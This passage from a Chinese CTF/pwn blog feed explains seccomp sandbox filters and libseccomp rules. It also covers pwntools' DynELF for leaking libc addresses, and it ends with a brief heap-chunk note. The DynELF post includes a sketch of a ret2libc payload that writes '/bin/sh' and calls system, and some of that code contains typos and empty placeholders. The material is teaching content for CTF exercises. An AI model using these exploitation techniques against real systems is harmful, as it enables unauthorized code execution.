data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">.</span>filter<span class=\"token operator\">=</span>filter<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span>SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？</p>\n<pre><code>结构体数组：\n数组中的每个元素都是一个结构体\n</code></pre>\n<p>因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后 <code>赋值</code> 的 sock_filter 结构体</p>\n<p>sock_filer 结构体:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> <span class=\"token punctuation\">&#123;</span>            <span class=\"token comment\">/* Filter block */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __u16 code<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* Actual filter code,bpf 指令码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    __u8  jt;                   /* Jump true */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    __u8  jf<span class=\"token punctuation\">;</span>                   <span class=\"token comment\">/* Jump false */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    __u32 k<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">/* Generic multiuse field */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//seccomp-data 结构体记录当前正在进行 bpf 规则检查的系统调用信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> nr<span class=\"token punctuation\">;</span><span class=\"token comment\">// 系统调用号</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    __u32 arch<span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用架构</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    __u64 instruction_pointer<span class=\"token punctuation\">;</span><span class=\"token comment\">//CPU 指令指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    __u64 argv<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 寄存器的值，x86 下是 ebx，exc,edx,edi,ebp;x64 下是 rdi,rsi,rdx,r10,r8,r9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</span></p>\n<h1 id=\"2seccomp库函数\"><a class=\"anchor\" href=\"#2seccomp库函数\">#</a> 2.seccomp 库函数</h1>\n<pre><code>SCMP_ACT_ALLOW(0x7fff0000U) 黑名单外的进程可以被执行（黑名单内的不能执行）\nSCMP_ACT_KILL( 0x00000000U) 白名单外的进程被杀死\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// 两个重要的宏，SCMP_ACT_ALLOW (0x7fff0000U) SCMP_ACT_KILL ( 0x00000000U)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//seccomp_init 初始化，参数为 0 表示白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的 syscall</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 参数为 0x7fff0000U 则为黑名单模式，在名单里的会被杀死</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v1 <span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 初始化失败，v1&lt;=0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//seccomp_rule_add 添加规则</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//v1 对应上面初始化的返回值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW（黑名单）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">231LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\">// seccomp_load - Load the current seccomp filter into the kernel</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">//load 成功则返回 0，这里 load 失败会执行 if 内部函数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  \t<span class=\"token comment\">// seccomp_release - Release the seccomp filter state</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  \t<span class=\"token comment\">// 但对已经 load 的过滤规则不影响</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  释放</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjczODY3Ng==\">https://blog.csdn.net/A951860555/article/details/116738676</span></p>\n<p>这里给出关于 <code>seccomp_load</code>  的定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> scmp_filter_ctx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>scmp_filter_ctx ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Link with <span class=\"token operator\">-</span>lseccomp<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>DESCRIPTION：</p>\n<p>Loads the seccomp filter provided by ctx into the kernel; if the function succeeds the new seccomp filter will be active when the  <code>function returns</code> .  函数返回时过滤开始运行</p>\n<p>返回值：Returns zero on success or one of the following error codes on failure；成功时返回  <code>0</code> ，失败返回对应错误代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vc2VjY29tcF9sb2FkLjMuZW4jREVTQ1JJUFRJT04=\">https://man.archlinux.org/man/seccomp_load.3.en#DESCRIPTION</span></p>\n<h1 id=\"3使用seccomp-tools\"><a class=\"anchor\" href=\"#3使用seccomp-tools\">#</a> 3. 使用 seccomp-tools</h1>\n<p>命令：<br />\nseccomp-tools dump ./pwn</p>\n<p>此处用 buuctf 例题  <code>orw</code>  说明：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<h1 id=\"4绕过\"><a class=\"anchor\" href=\"#4绕过\">#</a> 4. 绕过</h1>\n<p>一般运用 orw 函数的方式进行读取 flag</p>\n<h1 id=\"5注意\"><a class=\"anchor\" href=\"#5注意\">#</a> 5. 注意</h1>\n<p>当使用了 prctl (4, 0) 时</p>\n<p>4 对应的宏是 <code>PR_SET_DUMPABLE</code> ，第二个参数为 0 的话则不能被 dump，为 1 可以被 dump。换句话说，该程序我们无法使用 seccomp-tools dump ./pwn 来查看其系统调用情况，只能靠阅读代码分析。同时在进行 gdb 调试时，执行到 prctl (4, 0) 这行时程序也会被终止。不过只要以 root 身份执行，那么 <code>secccomp-tools</code>  和 gdb 调试都没问题，估计应该是限制了一般身份用户的 dump 行为</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjMxNzQ1NjE=\">https://zhuanlan.zhihu.com/p/363174561</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "title": "DynELF",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>由于在 pwn 题中有时候不给 libc，那么需要我们自己通过泄露函数地址来获得 libc 的基地址，而往往 LibcSearcher 无法准确的得到 libc 版本，那么我们就需要利用 DynELF，这是 pwntools 在早期版本就提供了一个解决方案 ——DynELF 类；利用方式与 ret2libc 类似，都是泄露函数地址来计算得到 libc 基址，通俗地讲，DynELF 就是通过程序漏洞泄露出任意地址内容，结合 ELF 文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>\n<p>并且：<br />\nwrite 函数是最理想的，因为 write 函数的特点在于其输出完全由其参数 size 决定，只要目标地址可读，size 填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响；而 puts, printf 函数会受到诸如‘\\0’, ‘\\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>\n<h1 id=\"使用方式\"><a class=\"anchor\" href=\"#使用方式\">#</a> 使用方式</h1>\n<p>首先需要构造一个函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#addr 为想要获得的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpayload_leak<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token string\">\"write_plt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload_leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfun_addr<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> fun_addr</pre></td></tr></table></figure><p>然后需要实例化该函数（指向 ELF 文件的指针或者使用 ELF 类加载的目标文件至少提供一个作为可选参数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>lead<span class=\"token punctuation\">,</span>pointer<span class=\"token operator\">=</span>pointer_into_ELF_file<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span>ELFObject<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>实例化举例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynEF<span class=\"token punctuation\">(</span> leak<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来可以运用实例化对象来找到想要的地址（通过这个实例 d 的方法 lookup 来搜寻 libc 库函数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#用 read 是因为程序里没有 '/bin/sh' 字符串时，还需要我们写入字符串，一般为 bbs 段内</span></pre></td></tr></table></figure><p>最后的 payload 为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">140</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#顺序为先执行 read 再到 system</span></pre></td></tr></table></figure><p>需要查看 write 函数能不能在程序中实现任意地址的读取打印<br />\n可以时可以用 DynELF</p>\n<p>DynELF 泄露函数方法最方便的使用情况是程序中最好含有 write 函数等输出函数且可以多次反复调用，并且 DynELF 找的是字符串</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkwL2FydGljbGUvZGV0YWlscy84NjY4OTc2MA==\">https://blog.csdn.net/qq_40827990/article/details/86689760</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "title": "堆",
            "date_published": "2023-08-24T12:15:56.000Z",
            "content_html": "<p>chunk 的 p 位设为 1 即上一个 chunk 被使用并且上一个 chunk 可以使用 pre_size 的空间  （用来储存前一个物理相邻的 chunk 的数据 ，（两个都空闲才合并）</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        }
    ]
}